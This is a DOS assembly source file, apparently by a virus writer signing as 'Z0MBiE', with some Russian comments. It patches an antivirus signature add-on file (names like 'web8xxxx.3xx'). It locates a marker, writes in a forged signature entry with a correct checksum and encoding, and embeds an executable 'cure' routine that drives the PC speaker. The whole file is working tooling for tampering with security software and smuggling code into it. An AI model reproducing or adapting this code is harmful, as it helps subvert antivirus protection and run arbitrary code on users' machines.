
include         rulez.inc

                org     100h
start:
                lea     dx, web_dopname
                call    web_infectdop

                mov     ax, 4c00h
                int     21h

web_dopname     db      'web8xxxx.3xx',0

web_infectdop:  mov     ax, 3d02h
                int     21h
                jc      @@exit
                xchg    bx, ax

                mov     ah, 3fh
                lea     dx, web_orig
                mov     cx, web_max
                int     21h
                mov     web_origsize, ax

                xchg    cx, ax

                mov     si, dx

                add     dx, cx
                dec     dx
                dec     dx
                dec     dx

@@1:            cmp     si, dx
                jae     @@close
                cmp     dword ptr [si], ' weN'
                je      @@2
                inc     si
                jmp     @@1
@@2:            add     si, 133

                mov     ax, 4200h
                xor     cx, cx
                lea     dx, [si + -(offset web_orig)]
                int     21h

                push    bx
                call    web_gendop
                pop     bx

                mov     ah, 40h
                lea     dx, web_encr
                mov     cx, web_encrsize
                int     21h

                mov     ah, 40h
                xor     cx, cx
                int     21h

@@close:        mov     ah, 3eh
                int     21h

@@exit:         ret

                ; input:  SI=offset
                ;         CX=size
                ; output: DX:AX=checsum

web_calccs:     xor     ax, ax
                cwd
                jcxz    @@2
                cld
@@1:            xor     dh, dl
                xor     dl, ah
                xor     ah, al
                lodsb
                xor     al, dh
                loop    @@1
@@2:            ret

web_gendop:     lea     di, web_norm + 6
                cld

                mov     ax, 666   ; version
                stosw
                mov     al, 0     ; ?
                stosb
                mov     al, 50    ; viruses in addon
                stosb

                mov     al, 'B'   ; ---------------
                stosb
                mov     al, 0     ; ноль/не ноль - существенно только для F-вирусов
                stosb

                mov     ax, web_stamm_size + 6  ; объем штаммов
                stosw

                lea     si, web_stamm
                mov     cx, web_stamm_size
                rep     movsb

                mov     ax, -1  ; последний штамм
                stosw
                stosw
                stosw

                mov     ax, web_name_size  ; объем имен
                stosw

                xchg    cx, ax   ; имя
                lea     si, web_name
                rep     movsb

                ; указатели на указатели на имена. к словам по этим адресам
                ; добавится смещение имен в сегменте штаммов

                mov     ax, 0018h
                stosw
                xor     ax, ax
                stosw

                mov     ax, 001Eh
                stosw
                xor     ax, ax
                stosw

                ; размер лечилок
                mov     ax, web_fuck_size
                add     ax, 4
                stosw

                ; лечилка

                mov     ax, web_fuck_size  ; сколько кода
                stosw

                xchg    cx, ax
                lea     si, web_fuck
                rep     movsb

                xor     ax, ax   ; опять указатели на релокейшны. в конце-0
                stosw

                xor     ax, ax   ; конец - пиздец
                stosw

                stosw ;???

                mov     ax, di
                sub     ax, offset web_norm

                mov     web_normsize, ax

                sub     ax, 6
                lea     di, web_norm
                stosw

                lea     si, web_norm + 6
                mov     cx, ax
                call    web_calccs

                stosw
                xchg    dx, ax
                stosw

; ---------------------------------------------------------------------------

                mov     ax, web_normsize
                inc     ax
                inc     ax
                cwd
                mov     cx, 3
                div     cx
                xchg    cx, ax

                lea     si, web_norm
                lea     di, web_encr

                xor     bp, bp

@@1:            lodsb
                mov     ah, al

                shr     al, 2

                call    web_encrbyte
                stosb

                and     ah, 11b
                shl     ah, 4

                lodsb

                push    ax

                shr     al, 4
                or      al, ah

                call    web_encrbyte
                stosb

                pop     ax

                mov     ah, al
                and     ah, 1111b
                shl     ah, 2

                lodsb

                push ax

                shr     al, 6
                or      al, ah

                call    web_encrbyte
                stosb

                pop     ax

                and     al, 00111111b
                call    web_encrbyte
                stosb

                inc     bp
                cmp     bp, 14
                jne     @@3
                xor     bp, bp

                mov     ax, 0a0dh
                stosw

@@3:            loop    @@1

                mov     al, '`'
                stosb
                stosb
                stosb
                mov     ax, 'di'        ; id
                stosw
                mov     ax, 0a0dh
                stosw

                sub     di, offset web_encr
                mov     web_encrsize, di

                ret

web_encrbyte:   or      al, al
                jnz     @@1
                mov     al, 40h
@@1:            add     al, 20h
                ret

web_name        db      'Z0MBiE',0
web_name_size   equ     $-web_name

web_stamm_size  equ     32
web_stamm       db      2 dup (0E9h, 0,0, 1, 0E9h,0,0,0)
                db      0FFh,8Fh,80h, 0,0, 5bh,0d5h,0, 0,0, 0,0, 0,0,0,0

web_fuck:       pusha
                push    ds es

                in      al, 61h
                or      al, 3
                out     61h, al

                xor     cx, cx
                loop    $

                in      al, 61h
                and     al, not 3
                out     61h, al

                pop     es ds
                popa
                ret

                db      'EOV'

web_fuck_size   equ     $-web_fuck



web_max         equ     2048

web_origsize    dw      ?
web_normsize    dw      ?
web_encrsize    dw      ?

web_orig        db      web_max dup (?)
web_norm        db      web_max dup (?)
web_encr        db      web_max dup (?)

                end     start
